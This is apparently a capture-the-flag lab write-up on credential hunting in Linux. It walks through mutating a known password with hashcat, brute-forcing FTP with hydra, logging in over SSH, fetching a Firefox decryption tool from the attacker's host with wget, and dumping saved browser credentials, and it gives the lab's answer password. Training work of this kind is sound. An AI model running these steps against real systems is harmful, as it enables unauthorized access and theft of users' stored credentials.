# Credential Hunting in Linux

### Examine the target and find out the password of the user Will. Then, submit the password as the answer.

```
nmap -sV 10.129.202.64  
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

Sometimes, we will not have any initial credentials available, and as the last step, we will need to bruteforce the credentials to available services to get access. From other hosts on the network, our colleagues were able to identify the user "Kira", who in most cases had SSH access to other systems with the password "LoveYou1". We have already provided a prepared list of passwords in the "Resources" section for simplicity's purpose.

based on the hint above, lets mutate kira password and try to login

```bash
#mutate the passsword
echo 'LoveYou1' > source.txt
hashcat --force source.txt -r custom.rule --stdout | sort -u > kira.list
hydra -l kira -P kira.list 10.129.202.64 ftp -t 64
[21][ftp] host: 10.129.202.64   login: kira   password: L0vey0u1!
```

we got creds, now lets ssh into it

```bash
#creds kira:L0vey0u1!
ssh kira@10.129.202.64
history
#bit about mozzilla interesting, lets enumerate further
ls -l .mozilla/firefox/ | grep default 
cat .mozilla/firefox/ytb95ytb.default-release/logins.json | jq .
```

The tool [Firefox Decrypt](https://github.com/unode/firefox\_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. FIrst lets transfer it

```bash
#Our vm
python3 -m http.server 8081
#target
wget http://10.10.14.179:8081/firefox_decrypt.py .
chmod +x firefox_decrypt.py
python3.9 firefox_decrypt.py 
Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release
2

Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```
